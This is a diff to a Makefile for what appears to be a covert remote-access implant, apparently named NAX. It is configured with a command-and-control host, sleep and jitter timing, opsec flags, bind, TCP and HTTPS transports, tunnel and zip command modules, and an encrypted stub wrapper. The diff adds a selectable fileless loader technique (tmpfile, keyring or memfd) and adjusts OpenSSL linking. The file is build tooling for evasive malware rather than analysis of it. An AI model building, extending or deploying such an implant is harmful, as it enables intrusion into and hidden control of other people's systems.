@@ -32,6 +32,8 @@ NAX_OPSEC       ?= 0
 NAX_SLEEP_MS    ?= 5000
 NAX_JITTER_PCT  ?= 0
 NAX_STUB        ?= 1
+# Loader technique: 0=auto 1=tmpfile 2=keyring 3=memfd
+NAX_LOADER_METHOD ?= 0
 
 RODATA_CRYPT    := src/stub/rodata_crypt.py
 comma           := ,
@@ -78,7 +80,14 @@ ifeq ($(NAX_TCP_MODE),bind)
              src/Commands/tunnel.c \
              src/Commands/zip.c \
              src/Transport/tcp_bind.c
-  LDFLAGS_EXTRA :=
+  ifeq ($(SSL_LIBS),)
+    SSL_LIBS  := $(shell pkg-config --libs   openssl 2>/dev/null || echo -lssl -lcrypto)
+  endif
+  ifeq ($(SSL_CFLAGS),)
+    SSL_CFLAGS := $(shell pkg-config --cflags openssl 2>/dev/null)
+  endif
+  CFLAGS      += $(SSL_CFLAGS)
+  LDFLAGS_EXTRA := $(SSL_LIBS)
 else ifeq ($(NAX_TCP_MODE),https)
   CFLAGS  += -DNAX_HTTPS_MODE \
              -DNAX_C2_HOST=\"$(NAX_C2_HOST)\" \
@@ -104,7 +113,7 @@ else ifeq ($(NAX_TCP_MODE),https)
   endif
   CFLAGS  += $(CURL_CFLAGS)
   LDFLAGS  = -pie -Wl,-Bstatic -lpthread -lz -Wl,-Bdynamic \
-             $(CURL_LIBS) -Wl,-z,relro,-z,now -Wl,-z,noexecstack
+             $(CURL_LIBS) -lssl -lcrypto -Wl,-z,relro,-z,now -Wl,-z,noexecstack
   LDFLAGS_EXTRA :=
 else
   CFLAGS  += -DNAX_C2_HOST=\"$(NAX_C2_HOST)\" \
@@ -115,18 +124,16 @@ else
              src/Commands/tunnel.c \
              src/Commands/zip.c \
              src/Transport/tcp.c
-  # TLS via OpenSSL — same cert-less client pattern as HTTPS transport.
-  # For cross-compile ARM64:
-  #   make NAX_TCP_MODE=tcp CC=aarch64-linux-gnu-gcc \
-  #        SSL_CFLAGS="-I/usr/include/aarch64-linux-gnu" \
-  #        SSL_LIBS="-L/usr/lib/aarch64-linux-gnu -lssl -lcrypto"
+  # TLS via OpenSSL — for cross-compile ARM64:
+  #   SSL_CFLAGS="-I/usr/include/aarch64-linux-gnu"
+  #   SSL_LIBS="-L/usr/lib/aarch64-linux-gnu -lssl -lcrypto"
   ifeq ($(SSL_LIBS),)
     SSL_LIBS  := $(shell pkg-config --libs   openssl 2>/dev/null || echo -lssl -lcrypto)
   endif
   ifeq ($(SSL_CFLAGS),)
     SSL_CFLAGS := $(shell pkg-config --cflags openssl 2>/dev/null)
   endif
-  CFLAGS      += $(SSL_CFLAGS)
+  CFLAGS        += $(SSL_CFLAGS)
   LDFLAGS_EXTRA := $(SSL_LIBS)
 endif
 
@@ -197,8 +204,8 @@ $(STUB_PAYLOAD): $(TARGET) $(STUB_GEN)
 	@cd $(STUB_DIR) && python3 gen_stub_payload.py ../../$(TARGET) >/dev/null
 
 $(OUTDIR)/.stub_built: $(TARGET) $(STUB_PAYLOAD) $(STUB_SRC)
-	@echo "[+] Wrapping $(TARGET) with stub"
-	$(CC) $(CFLAGS) $(STUB_SRC) -o $(TARGET)
+	@echo "[+] Wrapping $(TARGET) with stub (loader=NAX_LOADER_METHOD=$(NAX_LOADER_METHOD))"
+	$(CC) $(CFLAGS) -DNAX_LOADER_METHOD=$(NAX_LOADER_METHOD) $(STUB_SRC) -o $(TARGET)
 ifeq ($(NAX_DEBUG),0)
 	$(STRIP) $(TARGET)
 endif
